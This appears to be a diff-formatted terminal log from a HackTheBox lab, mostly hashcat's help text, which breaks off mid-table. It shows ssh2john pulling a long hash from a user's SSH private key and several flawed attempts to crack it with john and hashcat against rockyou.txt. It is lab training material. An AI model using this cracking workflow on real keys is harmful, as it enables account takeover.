@@ -1,0 +1,773 @@
+┌─[root@parrot]─[~/hackthebox/openadmin]   
+└──╼ #cd /opt/                             
+┌─[root@parrot]─[/opt]                     
+└──╼ #ls                                   
+BloodHound          finger-user-enum     impacket           php-reverse-shell                           SecLists      tmux-yank                  wordlists                    
+BurpSuiteCommunity  firmware-mod-kit     JAWS               PowerSploit                                 ssh2john.c    truffleHog                 xplico                       
+car-hacking         fsociety             linux_privsec      privilege-escalation-awesome-scripts-suite  Sublist3r     Ultimate-Facebook-Scraper  Yuki-Chan-The-Auto-Pentest   
+ctf-tools           ghidra               mRemoteNG-Decrypt  PRTG-Network-Monitor-RCE                    Teeth         unicorn                                                 
+dirsearch           ghidra_9.1.1_PUBLIC  nishang            pspy                                        tmux          Veil                                                    
+Empire              gobuster             passwords          python3-pwntools                            tmux-logging  wicd-git                                                
+┌─[root@parrot]─[/opt]                     
+└──╼ #rm ssh2john.c                        
+┌─[root@parrot]─[/opt]                     
+└──╼ #vi ssh2john.py                       
+┌─[root@parrot]─[/opt]                     
+└──╼ #chmod +x ssh2john.py                 
+┌─[root@parrot]─[/opt]                     
+└──╼ #./ssh2john.py ~/hackthebox/openadmin/joanna ~/hackthebox/openadmin/joanna.hash   
+/root/hackthebox/openadmin/joanna:$sshng$1$16$2AF25344B8391A25A9B318F3FD767D6D$1200$906d14608706c9ac6ea6342a692d9ed47a9b87044b94d72d5b61df25e68a5235991f8bac883f40b539c829550ea5937c69dfd2b4c589f8c910e4c9c030982541e51b4717013fafbe1e1db9d6331c83cca061cc7550c0f4dd98da46ec1c7f460e4a135b6f1f04bafaf66a08db17ecad8a60f25a1a095d4f94a530f9f0bf9222c6736a5f54f1ff93c6182af4ad8a407044eb16ae6cd2a10c92acffa6095441ed63215b6126ed62de25b2803233cc3ea533d56b72d15a71b291547983bf5bee5b0966710f2b4edf264f0909d6f4c0f9cb372f4bb323715d17d5ded5f83117233976199c6d86bfc28421e217ccd883e7f0eecbc6f227fdc8dff12ca87a61207803dd47ef1f2f6769773f9cb52ea7bb34f96019e00531fcc267255da737ca3af49c88f73ed5f44e2afda28287fc6926660b8fb0267557780e53b407255dcb44899115c568089254d40963c8511f3492efe938a620bde879c953e67cfb55dbbf347ddd677792544c3bb11eb0843928a34d53c3e94fed25bff744544a69bc80c4ffc87ffd4d5c3ef5fd01c8b4114cacde7681ea9556f22fc863d07a0f1e96e099e749416cca147add636eb24f5082f9224e2907e3464d71ae711cf8a3f21bd4476bf98c633ff1bbebffb42d24544298c918a7b14c501d2c43534b8428d34d500537f0197e75a4279bbe4e8d2acee3c1586a59b28671e406c0e178b4d29aaa7a478b0258bde6628a3de723520a66fb0b31f1ea5bf45b693f868d47c2d89692920e2898ccd89710c42227d31293d9dad740791453ec8ebfb26047ccca53e0a200e9112f345f5559f8ded2f193feedd8c1db6bd0fbfa5441aa773dd5c4a60defe92e1b7d79182af16472872ab3c222bdd2b5f941604b7de582b08ce3f6635d83f66e9b84e6fe9d3eafa166f9e62a4cdc993d42ed8c0ad5713205a9fc7e5bc87b2feeaffe05167a27b04975e9366fa254adf511ffd7d07bc1f5075d70b2a7db06f2224692566fb5e8890c6e39038787873f21c52ce14e1e70e60b8fca716feb5d0727ac1c355cf633226c993ca2f16b95c59b3cc31ac7f641335d80ff1ad3e672f88609ec5a4532986e0567e169094189dcc82d11d46bf73bc6c48a05f84982aa222b4c0e78b18cceb15345116e74f5fbc55d407ed9ba12559f57f37512998565a54fe77ea2a2224abbddea75a1b6da09ae3ac043b6161809b630174603f33195827d14d0ebd64c6e48e0d0346b469d664f89e2ef0e4c28b6a64acdd3a0edf8a61915a246feb25e8e69b3710916e494d5f482bf6ab65c675f73c39b2c2eecdca6709188c6f36b6331953e3f93e27c987a3743eaa71502c43a807d8f91cdc4dc33f48b852efdc8fcc2647f2e588ae368d69998348f0bfcfe6d65892aebb86351825c2aa45afc2e6869987849d70cec46ba951c864accfb8476d5643e7926942ddd8f0f32c296662ba659e999b0fb0bbfde7ba2834e5ec931d576e4333d6b5e8960e9de46d32daa5360ce3d0d6b864d3324401c4975485f1aef6ba618edb12d679b0e861fe5549249962d08d25dc2dde517b23cf9a76dcf482530c9a34762f97361dd95352de4c82263cfaa90796c2fa33dd5ce1d889a045d587ef18a5b940a2880e1c706541e2b523572a8836d513f6e688444af86e2ba9ad2ded540deadd9559eb56ac66fe021c3f88c2a1a484d62d602903793d10d                                       
+[/root/hackthebox/openadmin/joanna.hash] couldn't parse keyfile                        
+┌─[root@parrot]─[/opt]                     
+└──╼ #cd -                                 
+/root/hackthebox/openadmin                 
+┌─[root@parrot]─[~/hackthebox/openadmin]   
+└──╼ #ls                                   
+creds  exploit.sh  joanna  joanna.hash  l.sh  nmap  reverse.sh  shell.sh  www          
+┌─[root@parrot]─[~/hackthebox/openadmin]   
+└──╼ #vi joanna.hash                       
+┌─[root@parrot]─[~/hackthebox/openadmin]   
+└──╼ #john -m 16700 joanna.hash --wordlist=/opt/wordlists/rockyou.txt --force                                                                                                 
+Unknown option: "-m"                       
+┌─[✗]─[root@parrot]─[~/hackthebox/openadmin]                                           
+└──╼ #hashcat -m 16700 joanna.hash --wordlist=/opt/wordlists/rockyou.txt --force                                                                                              
+hashcat: option '--wordlist-autohex-disable' doesn't allow an argument                 
+Invalid argument specified.                
+
+┌─[✗]─[root@parrot]─[~/hackthebox/openadmin]                                           
+└──╼ #hashcat -m 16700 joanna.hash -wordlist=/opt/wordlists/rockyou.txt --force                                                                                               
+The specified parameter cannot use 'ordlist=/opt/wordlists/rockyou.txt' as a value - must be a number.                                                                        
+
+┌─[✗]─[root@parrot]─[~/hackthebox/openadmin]                                           
+└──╼ #hashcat --help                       
+hashcat - advanced password recovery       
+
+Usage: hashcat [options]... hash|hashfile|hccapxfile [dictionary|mask|directory]...    
+
+- [ Options ] -                            
+
+ Options Short / Long           | Type | Description                                          | Example                                                                       
+================================+======+======================================================+=======================                                                        
+ -m, --hash-type                | Num  | Hash-type, see references below                      | -m 1000                                                                       
+ -a, --attack-mode              | Num  | Attack-mode, see references below                    | -a 3                                                                          
+ -V, --version                  |      | Print version                                        |                                                                               
+ -h, --help                     |      | Print help                                           |                                                                               
+     --quiet                    |      | Suppress output                                      |                                                                               
+     --hex-charset              |      | Assume charset is given in hex                       |                                                                               
+     --hex-salt                 |      | Assume salt is given in hex                          |                                                                               
+     --hex-wordlist             |      | Assume words in wordlist are given in hex            |                                                                               
+     --force                    |      | Ignore warnings                                      |                                                                               
+     --status                   |      | Enable automatic update of the status screen         |                                                                               
+     --status-timer             | Num  | Sets seconds between status screen updates to X      | --status-timer=1                                                              
+     --stdin-timeout-abort      | Num  | Abort if there is no input from stdin for X seconds  | --stdin-timeout-abort=300                                                     
+     --machine-readable         |      | Display the status view in a machine-readable format |                                                                               
+     --keep-guessing            |      | Keep guessing the hash after it has been cracked     |                                                                               
+     --self-test-disable        |      | Disable self-test functionality on startup           |                                                                               
+     --loopback                 |      | Add new plains to induct directory                   |                                                                               
+     --markov-hcstat2           | File | Specify hcstat2 file to use                          | --markov-hcstat2=my.hcstat2                                                   
+     --markov-disable           |      | Disables markov-chains, emulates classic brute-force |                                                                               
+     --markov-classic           |      | Enables classic markov-chains, no per-position       |                                                                               
+ -t, --markov-threshold         | Num  | Threshold X when to stop accepting new markov-chains | -t 50                                                                         
+     --runtime                  | Num  | Abort session after X seconds of runtime             | --runtime=10                                                                  
+     --session                  | Str  | Define specific session name                         | --session=mysession                                                           
+     --restore                  |      | Restore session from --session                       |                                                                               
+     --restore-disable          |      | Do not write restore file                            |                                                                               
+     --restore-file-path        | File | Specific path to restore file                        | --restore-file-path=x.restore                                                 
+ -o, --outfile                  | File | Define outfile for recovered hash                    | -o outfile.txt                                                                
+     --outfile-format           | Num  | Define outfile-format X for recovered hash           | --outfile-format=7                                                            
+     --outfile-autohex-disable  |      | Disable the use of $HEX[] in output plains           |                                                                               
+     --outfile-check-timer      | Num  | Sets seconds between outfile checks to X             | --outfile-check=30                                                            
+     --wordlist-autohex-disable |      | Disable the conversion of $HEX[] from the wordlist   |                                                                               
+ -p, --separator                | Char | Separator char for hashlists and outfile             | -p :                                                                          
+     --stdout                   |      | Do not crack a hash, instead print candidates only   |                                                                               
+     --show                     |      | Compare hashlist with potfile; show cracked hashes   |                                                                               
+     --left                     |      | Compare hashlist with potfile; show uncracked hashes |                                                                               
+     --username                 |      | Enable ignoring of usernames in hashfile             |                                                                               
+     --remove                   |      | Enable removal of hashes once they are cracked       |                                                                               
+     --remove-timer             | Num  | Update input hash file each X seconds                | --remove-timer=30                                                             
+     --potfile-disable          |      | Do not write potfile                                 |                                                                               
+     --potfile-path             | File | Specific path to potfile                             | --potfile-path=my.pot                                                         
+     --encoding-from            | Code | Force internal wordlist encoding from X              | --encoding-from=iso-8859-15                                                   
+     --encoding-to              | Code | Force internal wordlist encoding to X                | --encoding-to=utf-32le                                                        
+     --debug-mode               | Num  | Defines the debug mode (hybrid only by using rules)  | --debug-mode=4                                                                
+     --debug-file               | File | Output file for debugging rules                      | --debug-file=good.log                                                         
+     --induction-dir            | Dir  | Specify the induction directory to use for loopback  | --induction=inducts                                                           
+     --outfile-check-dir        | Dir  | Specify the outfile directory to monitor for plains  | --outfile-check-dir=x                                                         
+     --logfile-disable          |      | Disable the logfile                                  |                                                                               
+     --hccapx-message-pair      | Num  | Load only message pairs from hccapx matching X       | --hccapx-message-pair=2                                                       
+     --nonce-error-corrections  | Num  | The BF size range to replace AP's nonce last bytes   | --nonce-error-corrections=16                                                  
+     --keyboard-layout-mapping  | File | Keyboard layout mapping table for special hash-modes | --keyb=german.hckmap                                                          
+     --truecrypt-keyfiles       | File | Keyfiles to use, separated with commas               | --truecrypt-keyf=x.png                                                        
+     --veracrypt-keyfiles       | File | Keyfiles to use, separated with commas               | --veracrypt-keyf=x.txt                                                        
+     --veracrypt-pim            | Num  | VeraCrypt personal iterations multiplier             | --veracrypt-pim=1000                                                          
+ -b, --benchmark                |      | Run benchmark of selected hash-modes                 |                                                                               
+     --benchmark-all            |      | Run benchmark of all hash-modes (requires -b)        |                                                                               
+     --speed-only               |      | Return expected speed of the attack, then quit       |                                                                               
+     --progress-only            |      | Return ideal progress step size and time to process  |                                                                               
+ -c, --segment-size             | Num  | Sets size in MB to cache from the wordfile to X      | -c 32                                                                         
+     --bitmap-min               | Num  | Sets minimum bits allowed for bitmaps to X           | --bitmap-min=24                                                               
+     --bitmap-max               | Num  | Sets maximum bits allowed for bitmaps to X           | --bitmap-max=24                                                               
+     --cpu-affinity             | Str  | Locks to CPU devices, separated with commas          | --cpu-affinity=1,2,3                                                          
+     --example-hashes           |      | Show an example hash for each hash-mode              |                                                                               
+ -I, --opencl-info              |      | Show info about detected OpenCL platforms/devices    | -I                                                                            
+     --opencl-platforms         | Str  | OpenCL platforms to use, separated with commas       | --opencl-platforms=2                                                          
+ -d, --opencl-devices           | Str  | OpenCL devices to use, separated with commas         | -d 1                                                                          
+ -D, --opencl-device-types      | Str  | OpenCL device-types to use, separated with commas    | -D 1                                                                          
+     --opencl-vector-width      | Num  | Manually override OpenCL vector-width to X           | --opencl-vector=4                                                             
+ -O, --optimized-kernel-enable  |      | Enable optimized kernels (limits password length)    |                                                                               
+ -w, --workload-profile         | Num  | Enable a specific workload profile, see pool below   | -w 3                                                                          
+ -n, --kernel-accel             | Num  | Manual workload tuning, set outerloop step size to X | -n 64                                                                         
+ -u, --kernel-loops             | Num  | Manual workload tuning, set innerloop step size to X | -u 256                                                                        
+ -T, --kernel-threads           | Num  | Manual workload tuning, set thread count to X        | -T 64                                                                         
+     --spin-damp                | Num  | Use CPU for device synchronization, in percent       | --spin-damp=50                                                                
+     --hwmon-disable            |      | Disable temperature and fanspeed reads and triggers  |                                                                               
+     --hwmon-temp-abort         | Num  | Abort if temperature reaches X degrees Celsius       | --hwmon-temp-abort=100                                                        
+     --scrypt-tmto              | Num  | Manually override TMTO value for scrypt to X         | --scrypt-tmto=3                                                               
+ -s, --skip                     | Num  | Skip X words from the start                          | -s 1000000                                                                    
+ -l, --limit                    | Num  | Limit X words from the start + skipped words         | -l 1000000                                                                    
+     --keyspace                 |      | Show keyspace base:mod values and quit               |                                                                               
+ -j, --rule-left                | Rule | Single rule applied to each word from left wordlist  | -j 'c'                                                                        
+ -k, --rule-right               | Rule | Single rule applied to each word from right wordlist | -k '^-'                                                                       
+ -r, --rules-file               | File | Multiple rules applied to each word from wordlists   | -r rules/best64.rule                                                          
+ -g, --generate-rules           | Num  | Generate X random rules                              | -g 10000                                                                      
+     --generate-rules-func-min  | Num  | Force min X functions per rule                       |                                                                               
+     --generate-rules-func-max  | Num  | Force max X functions per rule                       |                                                                               
+     --generate-rules-seed      | Num  | Force RNG seed set to X                              |                                                                               
+ -1, --custom-charset1          | CS   | User-defined charset ?1                              | -1 ?l?d?u                                                                     
+ -2, --custom-charset2          | CS   | User-defined charset ?2                              | -2 ?l?d?s                                                                     
+ -3, --custom-charset3          | CS   | User-defined charset ?3                              |                                                                               
+ -4, --custom-charset4          | CS   | User-defined charset ?4                              |                                                                               
+ -i, --increment                |      | Enable mask increment mode                           |                                                                               
+     --increment-min            | Num  | Start mask incrementing at X                         | --increment-min=4                                                             
+     --increment-max            | Num  | Stop mask incrementing at X                          | --increment-max=8                                                             
+ -S, --slow-candidates          |      | Enable slower (but advanced) candidate generators    |                                                                               
+     --brain-server             |      | Enable brain server                                  |                                                                               
+ -z, --brain-client             |      | Enable brain client, activates -S                    |                                                                               
+     --brain-client-features    | Num  | Define brain client features, see below              | --brain-client-features=3                                                     
+     --brain-host               | Str  | Brain server host (IP or domain)                     | --brain-host=127.0.0.1                                                        
+     --brain-port               | Port | Brain server port                                    | --brain-port=13743                                                            
+     --brain-password           | Str  | Brain server authentication password                 | --brain-password=bZfhCvGUSjRq                                                 
+     --brain-session            | Hex  | Overrides automatically calculated brain session     | --brain-session=0x2ae611db                                                    
+     --brain-session-whitelist  | Hex  | Allow given sessions only, separated with commas     | --brain-session-whitelist=0x2ae611db                                          
+
+- [ Hash modes ] -                         
+
+      # | Name                                             | Category                  
+  ======+==================================================+======================================                                                                            
+    900 | MD4                                              | Raw Hash                  
+      0 | MD5                                              | Raw Hash                  
+   5100 | Half MD5                                         | Raw Hash                  
+    100 | SHA1                                             | Raw Hash                  
+   1300 | SHA2-224                                         | Raw Hash                  
+   1400 | SHA2-256                                         | Raw Hash                  
+  10800 | SHA2-384                                         | Raw Hash                  
+   1700 | SHA2-512                                         | Raw Hash                  
+  17300 | SHA3-224                                         | Raw Hash                  
+  17400 | SHA3-256                                         | Raw Hash                  
+  17500 | SHA3-384                                         | Raw Hash                  
+  17600 | SHA3-512                                         | Raw Hash                  
+  17700 | Keccak-224                                       | Raw Hash                  
+  17800 | Keccak-256                                       | Raw Hash                  
+  17900 | Keccak-384                                       | Raw Hash                  
+  18000 | Keccak-512                                       | Raw Hash                  
+    600 | BLAKE2b-512                                      | Raw Hash                  
+  10100 | SipHash                                          | Raw Hash                  
+   6000 | RIPEMD-160                                       | Raw Hash                  
+   6100 | Whirlpool                                        | Raw Hash                  
+   6900 | GOST R 34.11-94                                  | Raw Hash                  
+  11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian | Raw Hash                  
+  11800 | GOST R 34.11-2012 (Streebog) 512-bit, big-endian | Raw Hash                  
+     10 | md5($pass.$salt)                                 | Raw Hash, Salted and/or Iterated                                                                                 
+     20 | md5($salt.$pass)                                 | Raw Hash, Salted and/or Iterated                                                                                 
+     30 | md5(utf16le($pass).$salt)                        | Raw Hash, Salted and/or Iterated                                                                                 
+     40 | md5($salt.utf16le($pass))                        | Raw Hash, Salted and/or Iterated                                                                                 
+   3800 | md5($salt.$pass.$salt)                           | Raw Hash, Salted and/or Iterated                                                                                 
+   3710 | md5($salt.md5($pass))                            | Raw Hash, Salted and/or Iterated                                                                                 
+   4010 | md5($salt.md5($salt.$pass))                      | Raw Hash, Salted and/or Iterated                                                                                 
+   4110 | md5($salt.md5($pass.$salt))                      | Raw Hash, Salted and/or Iterated                                                                                 
+   2600 | md5(md5($pass))                                  | Raw Hash, Salted and/or Iterated                                                                                 
+   3910 | md5(md5($pass).md5($salt))                       | Raw Hash, Salted and/or Iterated                                                                                 
+   4300 | md5(strtoupper(md5($pass)))                      | Raw Hash, Salted and/or Iterated                                                                                 
+   4400 | md5(sha1($pass))                                 | Raw Hash, Salted and/or Iterated                                                                                 
+    110 | sha1($pass.$salt)                                | Raw Hash, Salted and/or Iterated                                                                                 
+    120 | sha1($salt.$pass)                                | Raw Hash, Salted and/or Iterated                                                                                 
+    130 | sha1(utf16le($pass).$salt)                       | Raw Hash, Salted and/or Iterated                                                                                 
+    140 | sha1($salt.utf16le($pass))                       | Raw Hash, Salted and/or Iterated                                                                                 
+   4500 | sha1(sha1($pass))                                | Raw Hash, Salted and/or Iterated                                                                                 
+   4520 | sha1($salt.sha1($pass))                          | Raw Hash, Salted and/or Iterated                                                                                 
+   4700 | sha1(md5($pass))                                 | Raw Hash, Salted and/or Iterated                                                                                 
+   4900 | sha1($salt.$pass.$salt)                          | Raw Hash, Salted and/or Iterated                                                                                 
+  14400 | sha1(CX)                                         | Raw Hash, Salted and/or Iterated                                                                                 
+   1410 | sha256($pass.$salt)                              | Raw Hash, Salted and/or Iterated                                                                                 
+   1420 | sha256($salt.$pass)                              | Raw Hash, Salted and/or Iterated                                                                                 
+   1430 | sha256(utf16le($pass).$salt)                     | Raw Hash, Salted and/or Iterated                                                                                 
+   1440 | sha256($salt.utf16le($pass))                     | Raw Hash, Salted and/or Iterated                                                                                 
+   1710 | sha512($pass.$salt)                              | Raw Hash, Salted and/or Iterated                                                                                 
+   1720 | sha512($salt.$pass)                              | Raw Hash, Salted and/or Iterated                                                                                 
+   1730 | sha512(utf16le($pass).$salt)                     | Raw Hash, Salted and/or Iterated                                                                                 
+   1740 | sha512($salt.utf16le($pass))                     | Raw Hash, Salted and/or Iterated                                                                                 
+     50 | HMAC-MD5 (key = $pass)                           | Raw Hash, Authenticated   
+     60 | HMAC-MD5 (key = $salt)                           | Raw Hash, Authenticated   
+    150 | HMAC-SHA1 (key = $pass)                          | Raw Hash, Authenticated   
+    160 | HMAC-SHA1 (key = $salt)                          | Raw Hash, Authenticated   
+   1450 | HMAC-SHA256 (key = $pass)                        | Raw Hash, Authenticated   
+   1460 | HMAC-SHA256 (key = $salt)                        | Raw Hash, Authenticated   
+   1750 | HMAC-SHA512 (key = $pass)                        | Raw Hash, Authenticated   
+   1760 | HMAC-SHA512 (key = $salt)                        | Raw Hash, Authenticated   
+  11750 | HMAC-Streebog-256 (key = $pass), big-endian      | Raw Hash, Authenticated   
+  11760 | HMAC-Streebog-256 (key = $salt), big-endian      | Raw Hash, Authenticated   
+  11850 | HMAC-Streebog-512 (key = $pass), big-endian      | Raw Hash, Authenticated   
+  11860 | HMAC-Streebog-512 (key = $salt), big-endian      | Raw Hash, Authenticated   
+  14000 | DES (PT = $salt, key = $pass)                    | Raw Cipher, Known-Plaintext attack                                                                               
+  14100 | 3DES (PT = $salt, key = $pass)                   | Raw Cipher, Known-Plaintext attack                                                                               
+  14900 | Skip32 (PT = $salt, key = $pass)                 | Raw Cipher, Known-Plaintext attack                                                                               
+  15400 | ChaCha20                                         | Raw Cipher, Known-Plaintext attack                                                                               
+    400 | phpass                                           | Generic KDF               
+   8900 | scrypt                                           | Generic KDF               
+  11900 | PBKDF2-HMAC-MD5                                  | Generic KDF               
+  12000 | PBKDF2-HMAC-SHA1                                 | Generic KDF               
+  10900 | PBKDF2-HMAC-SHA256                               | Generic KDF               
+  12100 | PBKDF2-HMAC-SHA512                               | Generic KDF               
+     23 | Skype                                            | Network Protocols         
+   2500 | WPA-EAPOL-PBKDF2                                 | Network Protocols         
+   2501 | WPA-EAPOL-PMK                                    | Network Protocols         
+  16800 | WPA-PMKID-PBKDF2                                 | Network Protocols         
+  16801 | WPA-PMKID-PMK                                    | Network Protocols         
+   4800 | iSCSI CHAP authentication, MD5(CHAP)             | Network Protocols         
+   5300 | IKE-PSK MD5                                      | Network Protocols         
+   5400 | IKE-PSK SHA1                                     | Network Protocols         
+   5500 | NetNTLMv1                                        | Network Protocols         
+   5500 | NetNTLMv1+ESS                                    | Network Protocols         
+   5600 | NetNTLMv2                                        | Network Protocols         
+   7300 | IPMI2 RAKP HMAC-SHA1                             | Network Protocols         
+   7500 | Kerberos 5 AS-REQ Pre-Auth etype 23              | Network Protocols         
+   8300 | DNSSEC (NSEC3)                                   | Network Protocols         
+  10200 | CRAM-MD5                                         | Network Protocols         
+  11100 | PostgreSQL CRAM (MD5)                            | Network Protocols         
+  11200 | MySQL CRAM (SHA1)                                | Network Protocols         
+  11400 | SIP digest authentication (MD5)                  | Network Protocols         
+  13100 | Kerberos 5 TGS-REP etype 23                      | Network Protocols         
+  16100 | TACACS+                                          | Network Protocols         
+  16500 | JWT (JSON Web Token)                             | Network Protocols         
+  18200 | Kerberos 5 AS-REP etype 23                       | Network Protocols         
+    121 | SMF (Simple Machines Forum) > v1.1               | Forums, CMS, E-Commerce, Frameworks                                                                              
+    400 | phpBB3 (MD5)                                     | Forums, CMS, E-Commerce, Frameworks                                                                              
+   2611 | vBulletin < v3.8.5                               | Forums, CMS, E-Commerce, Frameworks                                                                              
+   2711 | vBulletin >= v3.8.5                              | Forums, CMS, E-Commerce, Frameworks                                                                              
+   2811 | MyBB 1.2+                                        | Forums, CMS, E-Commerce, Frameworks                                                                              
+   2811 | IPB2+ (Invision Power Board)                     | Forums, CMS, E-Commerce, Frameworks                                                                              
+   8400 | WBB3 (Woltlab Burning Board)                     | Forums, CMS, E-Commerce, Frameworks                                                                              
+     11 | Joomla < 2.5.18                                  | Forums, CMS, E-Commerce, Frameworks                                                                              
+    400 | Joomla >= 2.5.18 (MD5)                           | Forums, CMS, E-Commerce, Frameworks                                                                              
+    400 | WordPress (MD5)                                  | Forums, CMS, E-Commerce, Frameworks                                                                              
+   2612 | PHPS                                             | Forums, CMS, E-Commerce, Frameworks                                                                              
+   7900 | Drupal7                                          | Forums, CMS, E-Commerce, Frameworks                                                                              
+     21 | osCommerce                                       | Forums, CMS, E-Commerce, Frameworks                                                                              
+     21 | xt:Commerce                                      | Forums, CMS, E-Commerce, Frameworks                                                                              
+  11000 | PrestaShop                                       | Forums, CMS, E-Commerce, Frameworks                                                                              
+    124 | Django (SHA-1)                                   | Forums, CMS, E-Commerce, Frameworks                                                                              
+  10000 | Django (PBKDF2-SHA256)                           | Forums, CMS, E-Commerce, Frameworks                                                                              
+  16000 | Tripcode                                         | Forums, CMS, E-Commerce, Frameworks                                                                              
+   3711 | MediaWiki B type                                 | Forums, CMS, E-Commerce, Frameworks                                                                              
+  13900 | OpenCart                                         | Forums, CMS, E-Commerce, Frameworks                                                                              
+   4521 | Redmine                                          | Forums, CMS, E-Commerce, Frameworks                                                                              
+   4522 | PunBB                                            | Forums, CMS, E-Commerce, Frameworks                                                                              
+  12001 | Atlassian (PBKDF2-HMAC-SHA1)                     | Forums, CMS, E-Commerce, Frameworks                                                                              
+     12 | PostgreSQL                                       | Database Server           
+    131 | MSSQL (2000)                                     | Database Server           
+    132 | MSSQL (2005)                                     | Database Server           
+   1731 | MSSQL (2012, 2014)                               | Database Server           
+    200 | MySQL323                                         | Database Server           
+    300 | MySQL4.1/MySQL5                                  | Database Server           
+   3100 | Oracle H: Type (Oracle 7+)                       | Database Server           
+    112 | Oracle S: Type (Oracle 11+)                      | Database Server           
+  12300 | Oracle T: Type (Oracle 12+)                      | Database Server           
+   8000 | Sybase ASE                                       | Database Server           
+    141 | Episerver 6.x < .NET 4                           | HTTP, SMTP, LDAP Server   
+   1441 | Episerver 6.x >= .NET 4                          | HTTP, SMTP, LDAP Server   
+   1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)            | HTTP, SMTP, LDAP Server   
+  12600 | ColdFusion 10+                                   | HTTP, SMTP, LDAP Server   
+   1421 | hMailServer                                      | HTTP, SMTP, LDAP Server   
+    101 | nsldap, SHA-1(Base64), Netscape LDAP SHA         | HTTP, SMTP, LDAP Server   
+    111 | nsldaps, SSHA-1(Base64), Netscape LDAP SSHA      | HTTP, SMTP, LDAP Server   
+   1411 | SSHA-256(Base64), LDAP {SSHA256}                 | HTTP, SMTP, LDAP Server   
+   1711 | SSHA-512(Base64), LDAP {SSHA512}                 | HTTP, SMTP, LDAP Server   
+  16400 | CRAM-MD5 Dovecot                                 | HTTP, SMTP, LDAP Server   
+  15000 | FileZilla Server >= 0.9.55                       | FTP Server                
+  11500 | CRC32                                            | Checksums                 
+   3000 | LM                                               | Operating Systems         
+   1000 | NTLM                                             | Operating Systems         
+   1100 | Domain Cached Credentials (DCC), MS Cache        | Operating Systems         
+   2100 | Domain Cached Credentials 2 (DCC2), MS Cache 2   | Operating Systems         
+  15300 | DPAPI masterkey file v1                          | Operating Systems         
+  15900 | DPAPI masterkey file v2                          | Operating Systems         
+  12800 | MS-AzureSync  PBKDF2-HMAC-SHA256                 | Operating Systems         
+   1500 | descrypt, DES (Unix), Traditional DES            | Operating Systems         
+  12400 | BSDi Crypt, Extended DES                         | Operating Systems         
+    500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)        | Operating Systems         
+   3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating Systems         
+   7400 | sha256crypt $5$, SHA256 (Unix)                   | Operating Systems         
+   1800 | sha512crypt $6$, SHA512 (Unix)                   | Operating Systems         
+    122 | macOS v10.4, MacOS v10.5, MacOS v10.6            | Operating Systems         
+   1722 | macOS v10.7                                      | Operating Systems         
+   7100 | macOS v10.8+ (PBKDF2-SHA512)                     | Operating Systems         
+   6300 | AIX {smd5}                                       | Operating Systems         
+   6700 | AIX {ssha1}                                      | Operating Systems         
+   6400 | AIX {ssha256}                                    | Operating Systems         
+   6500 | AIX {ssha512}                                    | Operating Systems         
+   2400 | Cisco-PIX MD5                                    | Operating Systems         
+   2410 | Cisco-ASA MD5                                    | Operating Systems         
+    500 | Cisco-IOS $1$ (MD5)                              | Operating Systems         
+   5700 | Cisco-IOS type 4 (SHA256)                        | Operating Systems         
+   9200 | Cisco-IOS $8$ (PBKDF2-SHA256)                    | Operating Systems         
+   9300 | Cisco-IOS $9$ (scrypt)                           | Operating Systems         
+     22 | Juniper NetScreen/SSG (ScreenOS)                 | Operating Systems         
+    501 | Juniper IVE                                      | Operating Systems         
+  15100 | Juniper/NetBSD sha1crypt                         | Operating Systems         
+   7000 | FortiGate (FortiOS)                              | Operating Systems         
+   5800 | Samsung Android Password/PIN                     | Operating Systems         
+  13800 | Windows Phone 8+ PIN/password                    | Operating Systems         
+   8100 | Citrix NetScaler                                 | Operating Systems         
+   8500 | RACF                                             | Operating Systems         
+   7200 | GRUB 2                                           | Operating Systems         
+   9900 | Radmin2                                          | Operating Systems         
+    125 | ArubaOS                                          | Operating Systems         
+   7700 | SAP CODVN B (BCODE)                              | Enterprise Application Software (EAS)                                                                            
+   7701 | SAP CODVN B (BCODE) via RFC_READ_TABLE           | Enterprise Application Software (EAS)                                                                            
+   7800 | SAP CODVN F/G (PASSCODE)                         | Enterprise Application Software (EAS)                                                                            
+   7801 | SAP CODVN F/G (PASSCODE) via RFC_READ_TABLE      | Enterprise Application Software (EAS)                                                                            
+  10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1              | Enterprise Application Software (EAS)                                                                            
+   8600 | Lotus Notes/Domino 5                             | Enterprise Application Software (EAS)                                                                            
+   8700 | Lotus Notes/Domino 6                             | Enterprise Application Software (EAS)                                                                            
+   9100 | Lotus Notes/Domino 8                             | Enterprise Application Software (EAS)                                                                            
+    133 | PeopleSoft                                       | Enterprise Application Software (EAS)                                                                            
+  13500 | PeopleSoft PS_TOKEN                              | Enterprise Application Software (EAS)                                                                            
+  11600 | 7-Zip                                            | Archives                  
+  12500 | RAR3-hp                                          | Archives                  
+  13000 | RAR5                                             | Archives                  
+  13200 | AxCrypt                                          | Archives                  
+  13300 | AxCrypt in-memory SHA1                           | Archives                  
+  13600 | WinZip                                           | Archives                  
+  14700 | iTunes backup < 10.0                             | Backup                    
+  14800 | iTunes backup >= 10.0                            | Backup                    
+   62XY | TrueCrypt                                        | Full-Disk Encryption (FDE)                                                                                       
+     X  | 1 = PBKDF2-HMAC-RIPEMD160                        | Full-Disk Encryption (FDE)                                                                                       
+     X  | 2 = PBKDF2-HMAC-SHA512                           | Full-Disk Encryption (FDE)                                                                                       
+     X  | 3 = PBKDF2-HMAC-Whirlpool                        | Full-Disk Encryption (FDE)                                                                                       
+     X  | 4 = PBKDF2-HMAC-RIPEMD160 + boot-mode            | Full-Disk Encryption (FDE)                                                                                       
+      Y | 1 = XTS  512 bit pure AES                        | Full-Disk Encryption (FDE)                                                                                       
+      Y | 1 = XTS  512 bit pure Serpent                    | Full-Disk Encryption (FDE)                                                                                       
+      Y | 1 = XTS  512 bit pure Twofish                    | Full-Disk Encryption (FDE)                                                                                       
+      Y | 2 = XTS 1024 bit pure AES                        | Full-Disk Encryption (FDE)                                                                                       
+      Y | 2 = XTS 1024 bit pure Serpent                    | Full-Disk Encryption (FDE)                                                                                       
+      Y | 2 = XTS 1024 bit pure Twofish                    | Full-Disk Encryption (FDE)                                                                                       
+      Y | 2 = XTS 1024 bit cascaded AES-Twofish            | Full-Disk Encryption (FDE)                                                                                       
+      Y | 2 = XTS 1024 bit cascaded Serpent-AES            | Full-Disk Encryption (FDE)                                                                                       
+      Y | 2 = XTS 1024 bit cascaded Twofish-Serpent        | Full-Disk Encryption (FDE)                                                                                       
+      Y | 3 = XTS 1536 bit all                             | Full-Disk Encryption (FDE)                                                                                       
